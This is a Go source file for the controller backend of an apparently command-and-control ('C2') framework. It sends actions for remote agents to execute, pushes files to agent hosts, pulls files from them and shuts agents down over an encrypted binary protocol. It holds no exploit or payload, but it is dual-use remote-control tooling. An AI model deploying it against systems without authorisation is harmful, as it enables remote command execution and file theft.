// Package native implements the controlled-end backend and TCP server for
// the binary protocol used by remote-c / remote-py. It is byte-for-byte
// compatible with the existing agents.
package native

import (
	"context"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"sync"
	"sync/atomic"
	"time"

	"c2agent/internal/agent"
	"c2agent/internal/command"
	"c2agent/internal/protocol"
)

// shutdownGrace bounds how long Shutdown waits for the agent to exit and close
// the connection before the C2 forces it shut.
const shutdownGrace = 1 * time.Second

type dataChunk struct {
	flag uint8
	body []byte
	err  error
}

type dataQueue struct {
	ch   chan dataChunk
	done chan struct{}
}

// Backend executes actions on a native agent over an (encrypted) connection.
type Backend struct {
	conn    net.Conn
	writeMu *sync.Mutex

	pendingMu sync.Mutex
	pending   map[uint64]chan string

	dataMu     sync.Mutex
	dataQueues map[uint64]*dataQueue

	// late tracks requests that timed out but have not been answered yet, so
	// the agent is known to still be busy with them (see Busy).
	lateMu sync.Mutex
	late   map[uint64]struct{}

	nextReq   atomic.Uint64
	done      chan struct{}
	closeOnce sync.Once
}

// NewBackend wraps an established (post-handshake) connection.
func NewBackend(conn net.Conn) *Backend {
	return &Backend{
		conn:       conn,
		writeMu:    &sync.Mutex{},
		pending:    make(map[uint64]chan string),
		dataQueues: make(map[uint64]*dataQueue),
		late:       make(map[uint64]struct{}),
		done:       make(chan struct{}),
	}
}

func (b *Backend) markLate(reqID uint64) {
	b.lateMu.Lock()
	b.late[reqID] = struct{}{}
	b.lateMu.Unlock()
}

func (b *Backend) clearLate(reqID uint64) {
	b.lateMu.Lock()
	delete(b.late, reqID)
	b.lateMu.Unlock()
}

// Busy reports whether a timed-out request is still outstanding (its response
// or file-transfer end has not arrived). Implements agent.BusyReporter.
func (b *Backend) Busy() bool {
	b.lateMu.Lock()
	defer b.lateMu.Unlock()
	return len(b.late) > 0
}

func (b *Backend) write(pkt []byte) error {
	b.writeMu.Lock()
	defer b.writeMu.Unlock()
	_, err := b.conn.Write(pkt)
	return err
}

// deliver routes an inbound packet to the matching waiter (or download queue).
func (b *Backend) deliver(pkt *protocol.Packet) {
	// Any packet other than a "continue" data packet completes the request it
	// belongs to, so it is no longer late/busy.
	if pkt.Cmd != protocol.EndFlagContinue {
		b.clearLate(pkt.ReqID)
	}

	b.dataMu.Lock()
	dq := b.dataQueues[pkt.ReqID]
	b.dataMu.Unlock()
	if dq != nil {
		var c dataChunk
		switch pkt.Cmd {
		case protocol.EndFlagContinue, protocol.EndFlagLast:
			c = dataChunk{flag: pkt.Cmd, body: pkt.Body}
		default:
			c = dataChunk{err: fmt.Errorf("%s", string(pkt.Body))}
		}
		select {
		case dq.ch <- c:
		case <-dq.done:
		}
		return
	}

	b.pendingMu.Lock()
	ch := b.pending[pkt.ReqID]
	b.pendingMu.Unlock()
	if ch != nil {
		select {
		case ch <- string(pkt.Body):
		default:
		}
	}
}

func (b *Backend) forward(ctx context.Context, cmd uint8, params []string) (string, error) {
	if err := ctx.Err(); err != nil {
		return "", err
	}
	if b.Busy() {
		return "", agent.ErrAgentBusy
	}
	reqID := b.nextReq.Add(1)
	ch := make(chan string, 1)
	b.pendingMu.Lock()
	b.pending[reqID] = ch
	b.pendingMu.Unlock()
	defer func() {
		b.pendingMu.Lock()
		delete(b.pending, reqID)
		b.pendingMu.Unlock()
	}()

	pkt, err := protocol.EncodeRequest(reqID, cmd, params)
	if err != nil {
		return "", err
	}
	if err := b.write(pkt); err != nil {
		return "", agent.NewNetworkError("send: %v", err)
	}
	select {
	case out := <-ch:
		return out, nil
	case <-ctx.Done():
		// The agent may still be running the command; remember the request so
		// the backend reports Busy until its late response arrives.
		b.markLate(reqID)
		return "", ctx.Err()
	case <-b.done:
		return "", agent.NewNetworkError("connection closed")
	}
}

// Execute implements agent.Backend.
func (b *Backend) Execute(ctx context.Context, action string, params map[string]any) (string, error) {
	a, ok := protocol.ActionByName(action)
	if !ok {
		return "", fmt.Errorf("unknown action: %s", action)
	}
	tlv := make([]string, len(a.Params))
	for i, name := range a.Params {
		tlv[i] = command.String(params[name])
	}
	return b.forward(ctx, a.Code, tlv)
}

// Upload streams a local file to destPath on the agent.
func (b *Backend) Upload(ctx context.Context, localPath, destPath string) (string, error) {
	if err := ctx.Err(); err != nil {
		return "", err
	}
	if b.Busy() {
		return "", agent.ErrAgentBusy
	}
	info, err := os.Stat(localPath)
	if err != nil || info.IsDir() {
		return "Error: local file not found: " + localPath, nil
	}
	f, err := os.Open(localPath)
	if err != nil {
		return "Error: cannot open local file: " + err.Error(), nil
	}
	defer f.Close()

	reqID := b.nextReq.Add(1)
	ch := make(chan string, 1)
	b.pendingMu.Lock()
	b.pending[reqID] = ch
	b.pendingMu.Unlock()
	defer func() {
		b.pendingMu.Lock()
		delete(b.pending, reqID)
		b.pendingMu.Unlock()
	}()

	initPkt, err := protocol.EncodeRequest(reqID, protocol.CmdUpload, []string{destPath})
	if err != nil {
		return "", err
	}
	if err := b.write(initPkt); err != nil {
		return "", agent.NewNetworkError("upload init: %v", err)
	}

	buf := make([]byte, protocol.DataChunkSize)
	for {
		if err := ctx.Err(); err != nil {
			return "", err
		}
		n, rerr := f.Read(buf)
		if n > 0 {
			flag := uint8(protocol.EndFlagContinue)
			if n < protocol.DataChunkSize {
				flag = protocol.EndFlagLast
			}
			dp, _ := protocol.EncodeDataPacket(reqID, flag, buf[:n])
			if err := b.write(dp); err != nil {
				return "", agent.NewNetworkError("upload data: %v", err)
			}
			if flag == protocol.EndFlagLast {
				break
			}
			continue
		}
		if rerr == io.EOF {
			dp, _ := protocol.EncodeDataPacket(reqID, protocol.EndFlagLast, nil)
			if err := b.write(dp); err != nil {
				return "", agent.NewNetworkError("upload end: %v", err)
			}
			break
		}
		if rerr != nil {
			return "", rerr
		}
	}

	select {
	case out := <-ch:
		return out, nil
	case <-ctx.Done():
		b.markLate(reqID)
		return "", ctx.Err()
	case <-b.done:
		return "", agent.NewNetworkError("connection closed")
	}
}

// Download fetches srcPath into <destDir>/<basename(srcPath)>, overwriting.
func (b *Backend) Download(ctx context.Context, srcPath, destDir string) (string, error) {
	if b.Busy() {
		return "", agent.ErrAgentBusy
	}
	reqID := b.nextReq.Add(1)
	dq := &dataQueue{ch: make(chan dataChunk, 4096), done: make(chan struct{})}
	b.dataMu.Lock()
	b.dataQueues[reqID] = dq
	b.dataMu.Unlock()
	defer func() {
		b.dataMu.Lock()
		delete(b.dataQueues, reqID)
		b.dataMu.Unlock()
		close(dq.done)
	}()

	dest := filepath.Join(destDir, agent.BaseName(srcPath))
	pkt, err := protocol.EncodeRequest(reqID, protocol.CmdDownload, []string{srcPath})
	if err != nil {
		return "", err
	}
	if err := b.write(pkt); err != nil {
		return "", agent.NewNetworkError("download send: %v", err)
	}

	f, err := os.Create(dest)
	if err != nil {
		return "", err
	}
	cleanup := func() {
		f.Close()
		_ = os.Remove(dest)
	}
	for {
		select {
		case c := <-dq.ch:
			if c.err != nil {
				cleanup()
				return "", agent.NewNetworkError("download: %v", c.err)
			}
			if len(c.body) > 0 {
				if _, werr := f.Write(c.body); werr != nil {
					cleanup()
					return "", werr
				}
			}
			if c.flag == protocol.EndFlagLast {
				if err := f.Close(); err != nil {
					_ = os.Remove(dest)
					return "", err
				}
				return dest, nil
			}
		case <-ctx.Done():
			cleanup()
			b.markLate(reqID)
			return "", ctx.Err()
		case <-b.done:
			cleanup()
			return "", agent.NewNetworkError("connection closed")
		}
	}
}

// Shutdown asks the agent process to terminate, then waits briefly for it to
// exit and close the connection. If it does not (e.g. a wedged process), the
// C2 forces the socket shut instead of leaving a dead connection registered.
func (b *Backend) Shutdown(ctx context.Context) error {
	pkt, err := protocol.EncodeControl(0, protocol.CmdShutdown, []string{"shutdown"})
	if err != nil {
		return err
	}
	if err := b.write(pkt); err != nil {
		return agent.NewNetworkError("shutdown: %v", err)
	}
	select {
	case <-b.done:
	case <-time.After(shutdownGrace):
		_ = b.Close()
	}
	return nil
}

// Close wakes every pending request and closes the underlying connection.
func (b *Backend) Close() error {
	b.closeOnce.Do(func() { close(b.done) })
	return b.conn.Close()
}
